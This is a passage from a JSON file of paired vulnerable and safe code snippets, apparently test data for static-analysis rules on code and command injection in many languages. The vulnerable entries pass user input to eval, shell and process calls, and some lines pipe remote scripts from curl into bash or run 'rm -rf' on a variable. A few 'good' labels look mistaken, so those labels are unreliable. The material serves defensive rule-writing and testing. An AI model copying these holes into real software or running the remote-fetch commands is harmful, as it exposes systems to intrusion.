    "code": "// Static command is safe\nexec('whoami');\n\n// escapeshellarg prevents injection - SAFE\n$fullpath = $_POST['fullpath'];\n$filesize = trim(shell_exec('stat -c %s ' . escapeshellarg($fullpath)));\n\n// All user inputs escaped - SAFE\n$errorCode = escapeshellarg($_POST['errorCode']);\n$func = escapeshellarg($_POST['func']);\n$logsCmd = sprintf('%s%s%s',\n  \"wdlog -l INFO -s 'adminUI' function:string=$func \",\n  \"errorCode:string=$errorCode \",\n  \"corid:string='AUI:$uuid' >/dev/null 2>&1\"\n);\nexec($logsCmd);",
    "language": "php",
    "description": "PHP - static commands with escapeshellarg"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "$tainted = $_GET['userinput'];\n\n// User input in assert - VULNERABLE (equivalent to eval)\nassert($tainted);\n\nRoute::get('bad', function ($name) {\n  assert($name);\n});",
    "language": "php",
    "description": "PHP - dangerous assert with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "// Static assertion is safe\nassert('2 > 1');",
    "language": "php",
    "description": "PHP - static assert"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "// Backticks with user input - VULNERABLE\necho `ping -n 3 {$user_input}`;",
    "language": "php",
    "description": "PHP - backticks with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "public class HomeController : Controller\n{\n    [HttpPost]\n    [ValidateInput(false)]\n    public ActionResult Index(string inert, string razorTpl)\n    {\n        // User input directly in Razor.Parse - VULNERABLE\n        ViewBag.RenderedTemplate = Razor.Parse(razorTpl);\n        return View();\n    }\n}",
    "language": "csharp",
    "description": "C# - Razor template injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "public class HomeController : Controller\n{\n    [HttpPost]\n    [ValidateInput(false)]\n    public ActionResult Index(string inter, string razorTpl)\n    {\n        // Sanitize/transform input before parsing\n        var junk = someFunction(razorTpl);\n        ViewBag.RenderedTemplate = Razor.Parse(junk);\n        return View();\n    }\n}",
    "language": "csharp",
    "description": "C# - sanitized Razor template"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "object Smth {\n  def call1(code: String) = {\n    // String interpolation in eval - VULNERABLE\n    js.eval(s\"console.log($code)\")\n    true\n  }\n}\n\nobject FooBar {\n  def call2(code: String) = {\n    // String concatenation in eval - VULNERABLE\n    js.eval(\"console.log(\" + code +\")\")\n    true\n  }\n}",
    "language": "scala",
    "description": "Scala - ScalaJS eval with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "object Smth {\n  def call1(code: String) = {\n    // Static eval is safe\n    js.eval(\"FooBar()\")\n    true\n  }\n}",
    "language": "scala",
    "description": "Scala - static ScalaJS eval"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "# All of these are VULNERABLE\nbash <(curl -Ls \"https://raw.githubusercontent.com/pusox/pusox/main/script/_A.sh\")\n\ncurl http://10.110.1.200/deployment/scripts/setup.bash | /bin/bash -x\n\ncurl http://10.110.1.200/deployment/scripts/setup.bash | sudo /bin/bash\n\n/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"",
    "language": "bash",
    "description": "Bash - curl pipe to bash"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "# Download first, verify, then execute - SAFER\ncurl http://10.110.1.200/deployment/scripts/setup.bash -o setup.bash\n# Verify checksum here\nsha256sum -c setup.bash.sha256\nbash setup.bash",
    "language": "bash",
    "description": "Bash - download, verify, then execute"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "bad",
    "code": "x=$(curl -L https://raw.githubusercontent.com/something)\n# Eval'ing curl output - VULNERABLE\neval ${x}\n\nyy=`curl $SOME_URL`\neval ${yy}\n\n# Direct eval of curl - VULNERABLE\neval $(curl -L https://raw.githubusercontent.com/something)",
    "language": "bash",
    "description": "Bash - curl eval"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Code Injection",
    "type": "good",
    "code": "# Static eval is safe\neval \"x=1\"",
    "language": "bash",
    "description": "Bash - static eval"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "import os\nimport flask\n\napp = flask.Flask(__name__)\n\n@app.route(\"/route_param/<route_param>\")\ndef route_param(route_param):\n    # ruleid: os-system-injection\n    return os.system(route_param)\n\n@app.route(\"/route_param_concat/<route_param>\")\ndef route_param_concat(route_param):\n    # ruleid: os-system-injection\n    return os.system(\"echo \" + route_param)\n\n@app.route(\"/route_param_format/<route_param>\")\ndef route_param_format(route_param):\n    # ruleid: os-system-injection\n    return os.system(\"echo {}\".format(route_param))",
    "language": "python",
    "description": "vulnerable to command injection via os.system"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "import os\nimport flask\n\napp = flask.Flask(__name__)\n\n@app.route(\"/ok\")\ndef ok():\n    # ok: os-system-injection\n    os.system(\"This is fine\")\n\n@app.route(\"/route_param_ok/<route_param>\")\ndef route_param_ok(route_param):\n    # ok: os-system-injection\n    return os.system(\"ls -la\")",
    "language": "python",
    "description": "safe alternatives"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "import subprocess\nimport flask\n\napp = flask.Flask(__name__)\n\n@app.route(\"a\")\ndef a():\n    ip = flask.request.args.get(\"ip\")\n    # ruleid: subprocess-injection\n    subprocess.run(\"ping \"+ ip)\n\n@app.route(\"b\")\ndef b():\n    host = flask.request.headers[\"HOST\"]\n    # ruleid: subprocess-injection\n    subprocess.run(\"echo {} > log\".format(host))\n\n@app.route(\"f\")\ndef f():\n    event = flask.request.get_json()\n    # ruleid: subprocess-injection\n    subprocess.run([\"bash\", \"-c\", event['id']], shell=True)",
    "language": "python",
    "description": "vulnerable to command injection via subprocess"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "import subprocess\nimport flask\n\napp = flask.Flask(__name__)\n\n@app.route(\"ok\")\ndef ok():\n    ip = flask.request.args.get(\"ip\")\n    # ok: subprocess-injection\n    subprocess.run([\"ping\", ip])\n\n@app.route(\"ok2\")\ndef ok2():\n    ip = flask.request.args.get(\"ip\")\n    # ok: subprocess-injection\n    subprocess.run(\"echo 'nothing'\")\n\n@app.route(\"d_ok/<cmd>/<ip>\")\ndef d_ok(cmd, ip):\n    # ok: subprocess-injection\n    subprocess.capture_output([\"ping\", cmd, ip])",
    "language": "python",
    "description": "safe subprocess usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "import subprocess\nimport sys\n\n# ruleid: subprocess-shell-true\nsubprocess.call(\"grep -R {} .\".format(sys.argv[1]), shell=True)\n\n# ruleid: subprocess-shell-true\nsubprocess.run(\"grep -R {} .\".format(sys.argv[1]), shell=True)",
    "language": "python",
    "description": "subprocess with shell=True"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "import subprocess\nimport sys\n\n# ok: subprocess-shell-true\nsubprocess.call(\"echo 'hello'\")\n\n# ok: subprocess-shell-true\nsubprocess.call(\"echo 'hello'\", shell=True)  # safe with static string",
    "language": "python",
    "description": "avoid shell=True"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "import os\nimport sys\n\ncmd = sys.argv[2]\n\n# ruleid: dangerous-spawn-process\nos.spawnlp(os.P_WAIT, cmd)\n\n# ruleid: dangerous-spawn-process\nos.spawnve(os.P_WAIT, \"/bin/bash\", [\"-c\", cmd], os.environ)",
    "language": "python",
    "description": "dangerous os.spawn"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "import os\n\n# ok: dangerous-spawn-process\nos.spawnlp(os.P_WAIT, \"ls\")\n\n# ok: dangerous-spawn-process\nos.spawnv(os.P_WAIT, \"/bin/ls\")",
    "language": "python",
    "description": "safe os.spawn usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "const {exec, spawnSync} = require('child_process');\nconst cp = require('child_process');\n\nfunction a(args) {\n  // ruleid: detect-child-process\n  exec(`cat *.js ${args[0]}| wc -l`, (error, stdout, stderr) => {\n    console.log(stdout)\n  });\n}\n\nfunction a(userInput) {\n  // ruleid: detect-child-process\n  cp.spawnSync(userInput);\n}",
    "language": "javascript",
    "description": "vulnerable child_process"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "const {spawn, spawnSync} = require('child_process');\n\n// ruleid: spawn-shell-true\nconst ls = spawn('ls', ['-lh', '/usr'], {shell: true});\n\n// ruleid: spawn-shell-true\nconst pid = spawnSync('ls', ['-lh', '/usr'], {shell: '/bin/sh'});",
    "language": "javascript",
    "description": "safe child_process usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "const {spawn, spawnSync} = require('child_process');\n\n// ok: spawn-shell-true\nspawn('ls', ['-lh', '/usr'], {shell: false});\n\n// ok: spawn-shell-true\nspawn('ls', ['-lh', '/usr'], {});",
    "language": "javascript",
    "description": "spawn without shell"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "const {spawn, spawnSync} = require('child_process');\nconst cp = require('child_process');\n\nfunction test1(userInput) {\n    let name = \"bash\";\n    // ruleid: dangerous-spawn-shell\n    spawnSync(name, [\"-c\", userInput]);\n}\n\nfunction test2(userInput) {\n    // ruleid: dangerous-spawn-shell\n    cp.spawn('sh', [userInput]);\n}",
    "language": "javascript",
    "description": "dangerous spawn shell execution"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "const {spawn} = require('child_process');\n\nfunction testOk(userInput) {\n    foobar(userInput);\n    // ok: dangerous-spawn-shell\n    spawn('ls', ['-la', '/tmp']);\n}",
    "language": "javascript",
    "description": "safe spawn usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "const { spawn } = require('child_process');\n\nfunction downloadGitCommit(gitBranch, gitUrl, sourceCodePath) {\n    // ruleid: spawn-git-clone\n    const gitClone = spawn('git', [\n        'clone',\n        '--branch', gitBranch,\n        '--depth', '1',\n        gitUrl,\n        sourceCodePath\n    ]);\n    return gitClone;\n}",
    "language": "javascript",
    "description": "git clone with user-controlled URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "const { spawn } = require('child_process');\n\nfunction downloadGitCommitOk() {\n    // ok: spawn-git-clone\n    const gitClone = spawn('git', [ 'clone', 'https://hardcoded-url.com' ]);\n    return res.send('ok');\n}",
    "language": "javascript",
    "description": "hardcoded git URL"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "const shell = require('shelljs');\n\nfunction test1(userInput) {\n    // ruleid: shelljs-exec-injection\n    return shell.exec(userInput, {silent: true})\n}\n\nfunction test2(userInput) {\n    const input = `ls ${userInput}`\n    // ruleid: shelljs-exec-injection\n    return shell.exec(input, {silent: true})\n}",
    "language": "javascript",
    "description": "shelljs exec injection"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "const shell = require('shelljs');\n\nfunction okTest3(userInput) {\n    // ok: shelljs-exec-injection\n    const input = 'ls ./'\n    return shell.exec(input, {silent: true})\n}",
    "language": "javascript",
    "description": "safe shelljs usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "async function test1(userInput) {\n  const p = Deno.run({\n    // ruleid: deno-dangerous-run\n    cmd: [userInput, \"hello\"],\n    stdout: \"piped\",\n    stderr: \"piped\",\n  });\n\n  await p.status();\n}\n\nasync function test2(userInput) {\n  const p = Deno.run({\n    // ruleid: deno-dangerous-run\n    cmd: [\"bash\", \"-c\", userInput],\n    stdout: \"piped\",\n    stderr: \"piped\",\n  });\n\n  await p.status();\n}",
    "language": "javascript",
    "description": "Deno dangerous run"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "async function okTest() {\n  const p = Deno.run({\n    cmd: [\"echo\", \"hello\"],\n  });\n\n  await p.status();\n}",
    "language": "javascript",
    "description": "safe Deno.run"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "public class TestExecutor {\n\n    private Pair<Integer, String> test1(String command, Logger logAppender) throws IOException {\n      String[] cmd = new String[3];\n      String osName = System.getProperty(\"os.name\");\n      if (osName.startsWith(\"Windows\")) {\n          cmd[0] = \"cmd.exe\";\n          cmd[1] = \"/C\";\n      } else {\n          cmd[0] = \"/bin/bash\";\n          cmd[1] = \"-c\";\n      }\n      cmd[2] = command;\n\n      // ruleid: command-injection-process-builder\n      ProcessBuilder builder = new ProcessBuilder(cmd);\n      builder.redirectErrorStream(true);\n      Process proc = builder.start();\n      return Pair.newPair(1, \"Killed\");\n    }\n\n    public String test2(String userInput) {\n      ProcessBuilder builder = new ProcessBuilder();\n      // ruleid: command-injection-process-builder\n      builder.command(userInput);\n      return \"foo\";\n    }\n\n    public String test3(String userInput) {\n      ProcessBuilder builder = new ProcessBuilder();\n      // ruleid: command-injection-process-builder\n      builder.command(\"bash\", \"-c\", userInput);\n      return \"foo\";\n    }\n}",
    "language": "java",
    "description": "ProcessBuilder with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "public class TestExecutor {\n\n    public String okTest() {\n      ProcessBuilder builder = new ProcessBuilder();\n      // ok: command-injection-process-builder\n      builder.command(\"bash\", \"-c\", \"ls\");\n      return \"foo\";\n    }\n}",
    "language": "java",
    "description": "safe ProcessBuilder usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "import java.lang.Runtime;\n\nclass Cls {\n\n    public Cls(String input) {\n        Runtime r = Runtime.getRuntime();\n        // ruleid: command-injection-formatted-runtime-call\n        r.exec(\"/bin/sh -c some_tool\" + input);\n    }\n\n    public void test1(String input) {\n        Runtime r = Runtime.getRuntime();\n        // ruleid: command-injection-formatted-runtime-call\n        r.loadLibrary(String.format(\"%s.dll\", input));\n    }\n\n    public void test2(String input) {\n        // ruleid: command-injection-formatted-runtime-call\n        Runtime.getRuntime().exec(\"bash\", \"-c\", input);\n    }\n}",
    "language": "java",
    "description": "Runtime.exec with formatted string"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "import java.lang.Runtime;\n\nclass Cls {\n\n    public void okTest(String input) {\n        Runtime r = Runtime.getRuntime();\n        // ok: command-injection-formatted-runtime-call\n        r.exec(\"echo 'blah'\");\n    }\n\n    public void okTest2(String input) {\n        // ok: command-injection-formatted-runtime-call\n        Runtime.getRuntime().loadLibrary(\"lib.dll\");\n    }\n}",
    "language": "java",
    "description": "safe Runtime usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "@WebServlet(value = \"/cmdi-00/BenchmarkTest00006\")\npublic class bad1 extends HttpServlet {\n\n    @Override\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        String param = \"\";\n        if (request.getHeader(\"BenchmarkTest00006\") != null) {\n            param = request.getHeader(\"BenchmarkTest00006\");\n        }\n\n        java.util.List<String> argList = new java.util.ArrayList<String>();\n        argList.add(\"sh\");\n        argList.add(\"-c\");\n        // ruleid: tainted-cmd-from-http-request\n        argList.add(\"echo \" + param);\n\n        ProcessBuilder pb = new ProcessBuilder();\n        pb.command(argList);\n        Process p = pb.start();\n    }\n}",
    "language": "java",
    "description": "tainted HTTP request to command"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "@WebServlet(value = \"/cmdi-00/BenchmarkTest00006\")\npublic class ok1 extends HttpServlet {\n\n    @Override\n    public void doPost(HttpServletRequest request, HttpServletResponse response)\n            throws ServletException, IOException {\n        java.util.List<String> argList = new java.util.ArrayList<String>();\n        argList.add(\"sh\");\n        argList.add(\"-c\");\n        // ok: tainted-cmd-from-http-request\n        argList.add(\"echo \" + \"param\");\n\n        ProcessBuilder pb = new ProcessBuilder();\n        pb.command(argList);\n        Process p = pb.start();\n    }\n}",
    "language": "java",
    "description": "safe command construction"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "using System.Diagnostics;\n\nnamespace Injections\n{\n    public class OsCommandInjection\n    {\n        public void RunOsCommand(string command)\n        {\n            // ruleid: os-command-injection\n            var process = Process.Start(command);\n        }\n\n        public void RunOsCommandWithArgs(string command, string arguments)\n        {\n            // ruleid: os-command-injection\n            var process = Process.Start(command, arguments);\n        }\n\n        public void RunOsCommandWithProcessParam(string command)\n        {\n            Process process = new Process();\n            process.StartInfo.FileName = command;\n            // ruleid: os-command-injection\n            process.Start();\n        }\n\n        public void RunOsCommandWithStartInfo(string command)\n        {\n            ProcessStartInfo processStartInfo = new ProcessStartInfo()\n            {\n                FileName = command\n            };\n            // ruleid: os-command-injection\n            var process = Process.Start(processStartInfo);\n        }\n    }\n}",
    "language": "csharp",
    "description": "Process.Start with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "using System.Diagnostics;\n\nnamespace Injections\n{\n    public class OsCommandInjection\n    {\n        public void RunOsCommand(string command)\n        {\n            // ok: os-command-injection\n            var process = Process.Start(\"constant\");\n        }\n\n        public void RunOsCommandWithArgs(string command, string arguments)\n        {\n            // ok: os-command-injection\n            var process = Process.Start(\"constant\", \"constant\");\n        }\n\n        public void RunOsCommandWithStartInfo(string command)\n        {\n            ProcessStartInfo processStartInfo = new ProcessStartInfo()\n            {\n                FileName = \"constant\"\n            };\n            // ok: os-command-injection\n            var process = Process.Start(processStartInfo);\n        }\n    }\n}",
    "language": "csharp",
    "description": "safe Process.Start usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "class TestOsCommand {\n\n  def executeCommand(value: String) = Action {\n    import sys.process._\n\n    // ruleid: scala-dangerous-process-run\n    val result = value.!!\n    Ok(\"Result:\\n\"+result)\n  }\n\n  def executeCommand2(value: String) = Action {\n    import sys.process._\n\n    // ruleid: scala-dangerous-process-run\n    val result = value !\n    Ok(\"Result:\\n\"+result)\n  }\n}",
    "language": "scala",
    "description": "dangerous process run with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "class TestOsCommand {\n\n  def executeCommand4(value: String) = Action {\n    import sys.process._\n\n    // ok: scala-dangerous-process-run\n    val cmd = \"ls -lah\"\n    val result = cmd.!\n    Ok(\"Result:\\n\"+result)\n  }\n\n  def executeCommand6() = Action {\n    import sys.process._\n\n    // ok: scala-dangerous-process-run\n    val result = Seq(\"ls\", \"-lah\").!!\n    Ok(\"Result:\\n\"+result)\n  }\n}",
    "language": "scala",
    "description": "safe process usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "class Foo {\n  def run1(message: String) = {\n    import sys.process._\n    // ruleid: dangerous-shell-run\n    Seq(\"sh\", \"-c\", message).!\n  }\n\n  def run2(message: String) = {\n    import sys.process._\n    // ruleid: dangerous-shell-run\n    val result = Seq(\"bash\", \"-c\", message).!!\n    return result\n  }\n}",
    "language": "scala",
    "description": "dangerous shell run with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "class Foo {\n  def run3(message: String) = {\n    import sys.process._\n    // ok: dangerous-shell-run\n    Seq(\"ls\", \"-la\").!!\n  }\n\n  def run4(message: String) = {\n    import sys.process._\n    // ok: dangerous-shell-run\n    Seq(\"sh\", \"-c\", \"ls\").!!\n  }\n}",
    "language": "scala",
    "description": "safe shell usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "class Foo {\n  def run1(command: String, arg1: String) = {\n    import sys.process._\n    // ruleid: dangerous-seq-run\n    Seq(command, arg1).!\n  }\n\n  def run2(command: String) = {\n    import sys.process._\n    // ruleid: dangerous-seq-run\n    val result = Seq(command, \"--some-arg\").!!\n    return result\n  }\n}",
    "language": "scala",
    "description": "dangerous Seq run"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "class Foo {\n  def run3(message: String) = {\n    import sys.process._\n    // ok: dangerous-seq-run\n    Seq(\"ls\", \"-la\").!!\n  }\n}",
    "language": "scala",
    "description": "safe Seq usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "class Cls {\n    fun Cls(input: String) {\n        val r: Runtime = Runtime.getRuntime()\n        // ruleid: command-injection-formatted-runtime-call\n        r.exec(\"/bin/sh -c some_tool\" + input)\n    }\n\n    fun test1(input: String) {\n        val r: Runtime = Runtime.getRuntime()\n        // ruleid: command-injection-formatted-runtime-call\n        r.loadLibrary(String.format(\"%s.dll\", input))\n    }\n}",
    "language": "kotlin",
    "description": "Runtime.exec with formatted string"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "class Cls {\n    fun test2(input: String) {\n        val r: Runtime = Runtime.getRuntime()\n        // ok: command-injection-formatted-runtime-call\n        r.exec(\"echo 'blah'\")\n    }\n}",
    "language": "kotlin",
    "description": "safe Runtime usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "def foo\n  # ruleid: avoid-tainted-shell-call\n  Shell.cat(params[:filename])\n\n  sh = Shell.cd(\"/tmp\")\n  # ruleid: avoid-tainted-shell-call\n  sh.open(params[:filename])\n\n  sh = Shell.new\n  fn = params[:filename]\n  # ruleid: avoid-tainted-shell-call\n  sh.open(fn)\nend",
    "language": "ruby",
    "description": "Shell methods with tainted input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "def foo\n  # ok: avoid-tainted-shell-call\n  Shell.cat(\"/var/log/www/access.log\")\nend",
    "language": "ruby",
    "description": "safe Shell usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "<?php\n// ruleid: wp-command-execution-audit\nexec('rm -rf ' . $dir, $o, $r);\n\n// ruleid: wp-command-execution-audit\n$stderr = shell_exec($command);\n\n// ruleid: eval-use\neval($user_input);\n?>",
    "language": "php",
    "description": "command execution with user input"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "<?php\n// ok: wp-command-execution-audit\nsome_other_safe_function($args);\n\n// ok: eval-use\neval('echo \"OK\"');\n?>",
    "language": "php",
    "description": "safe command usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "import (\n  \"fmt\"\n  \"os/exec\"\n)\n\nfunc test1(password string) {\n  cmd := exec.Command(\"bash\")\n  cmdWriter, _ := cmd.StdinPipe()\n  cmd.Start()\n\n  cmdString := fmt.Sprintf(\"sshpass -p %s\", password)\n\n  // ruleid: dangerous-command-write\n  cmdWriter.Write([]byte(cmdString + \"\\n\"))\n\n  cmd.Wait()\n}",
    "language": "go",
    "description": "dangerous command write"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "import (\n  \"os/exec\"\n)\n\nfunc okTest1() {\n  cmd := exec.Command(\"bash\")\n  cmdWriter, _ := cmd.StdinPipe()\n  cmd.Start()\n\n  // ok: dangerous-command-write\n  cmdWriter.Write([]byte(\"sshpass -p 123\\n\"))\n  cmdWriter.Write([]byte(\"exit\" + \"\\n\"))\n\n  cmd.Wait()\n}",
    "language": "go",
    "description": "safe command usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "#load \"unix.cma\";;\nlet p = String.concat \"ls \" [\" \"; Sys.argv.(1)]\n(* ruleid: ocamllint-exec *)\nlet a = Unix.execve p\n(* ruleid: ocamllint-exec *)\nlet b = Unix.execvp p\n(* ruleid: ocamllint-exec *)\nlet d = Unix.system p\n(* ruleid: ocamllint-exec *)\nlet e = Sys.command p",
    "language": "ocaml",
    "description": "executing external programs"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "import subprocess\n\ndef handler(event, context):\n  # ruleid: dangerous-subprocess-use\n  subprocess.call(\"grep -R {} .\".format(event['id']), shell=True)\n\n  cmd = event['id'].split()\n  # ruleid: dangerous-subprocess-use\n  subprocess.call([cmd[0], cmd[1], \"some\", \"args\"], shell=True)",
    "language": "python",
    "description": "dangerous subprocess in Lambda"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "import subprocess\n\ndef handler(event, context):\n  # ok: dangerous-subprocess-use\n  subprocess.call(\"echo 'hello'\")\n\n  # ok: dangerous-subprocess-use\n  subprocess.call([\"echo\", \"a\", \";\", \"rm\", \"-rf\", \"/\"])",
    "language": "python",
    "description": "safe subprocess in Lambda"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "import os\n\ndef handler(event, context):\n    # ruleid: dangerous-system-call\n    os.system(f\"ls -la {event['dir']}\")",
    "language": "python",
    "description": "dangerous system call in Lambda"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "import os\n\ndef handler(event, context):\n    # ok: dangerous-system-call\n    os.system(\"ls -al\")\n\n    # ok: dangerous-system-call\n    os.popen(\"cat contents.txt\")",
    "language": "python",
    "description": "safe system call in Lambda"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "const cp = require('child_process');\n\nexports.handler = async (event) => {\n    // ruleid: detect-child-process\n    cp.exec(`cat *.js ${event['file']}| wc -l`, (error, stdout, stderr) => {\n        console.log(stdout)\n    });\n\n    // ruleid: detect-child-process\n    cp.spawnSync(event['cmd']);\n};",
    "language": "javascript",
    "description": "child_process in Lambda"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "const cp = require('child_process');\n\nexports.handler = async (event) => {\n    // ok: detect-child-process\n    cp.exec('ls')\n};",
    "language": "javascript",
    "description": "safe child_process in Lambda"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "bad",
    "code": "from airflow.operators.bash_operator import BashOperator\nimport requests\n\nmessage = requests.get(\"https://fakeurl.asdf/message\").text\n# ruleid: formatted-string-bashoperator\nt1 = BashOperator(\n    task_id=\"print_date\",\n    bash_command=\"echo \" + message,\n    dag=dag\n)\n\nhowlong = requests.get(\"https://fakeurl.asdf/howlong\").text\n# ruleid: formatted-string-bashoperator\ncommand = \"sleep {}\".format(howlong)\nt2 = BashOperator(\n    task_id=\"sleep\",\n    bash_command=command,\n    dag=dag\n)",
    "language": "python",
    "description": "formatted string in BashOperator"
  },
  {
    "ruleId": "",
    "ruleTitle": "Prevent Command Injection",
    "type": "good",
    "code": "from airflow.operators.bash_operator import BashOperator\n\n# ok: formatted-string-bashoperator\nt5 = BashOperator(\n    task_id=\"safe\",\n    bash_command=\"echo hello world!\",\n    dag=dag\n)\n\n# ok: formatted-string-bashoperator\ntemplated_command = \"\"\"\n{% for i in range(5) %}\n    echo \"{{ ds }}\"\n    echo \"{{ params.my_param }}\"\n{% endfor %}\n\"\"\"\n\nt4 = BashOperator(\n    task_id=\"safe_templated\",\n    bash_command=templated_command,\n    params={\"my_param\": \"Parameter I passed in\"},\n    dag=dag\n)",
    "language": "python",
    "description": "safe BashOperator usage"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "def append_func1(default=[]):\n    # ruleid: default-mutable-list\n    default.append(5)",
    "language": "python",
    "description": "INCORRECT** - Mutating default list example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "def assign_func1(default={}):\n    # ruleid: default-mutable-dict\n    default[\"potato\"] = 5",
    "language": "python",
    "description": "INCORRECT** - Mutating default dict example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "good",
    "code": "def not_append_func2(default=[]):\n    # list() returns a copy\n    default = list(default)\n    default.append(5)\n\ndef not_assign_func2(default={}):\n    # dict() returns a copy\n    default = dict(default)\n    default[123] = 456",
    "language": "python",
    "description": "CORRECT** - Copy before mutating example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
    "code": "a = [1, 2, 3, 4]\n# ruleid:list-modify-while-iterate\nfor i in a:\n    print(i)\n    a.pop(0)\n\nb = [1, 2, 3, 4]\n# ruleid:list-modify-while-iterate\nfor i in b:\n    print(i)\n    b.append(0)",
    "language": "python",
    "description": "INCORRECT** - Modifying list while iterating example for Code Correctness"
  },
  {
    "ruleId": "",
    "ruleTitle": "Code Correctness",
    "type": "bad",
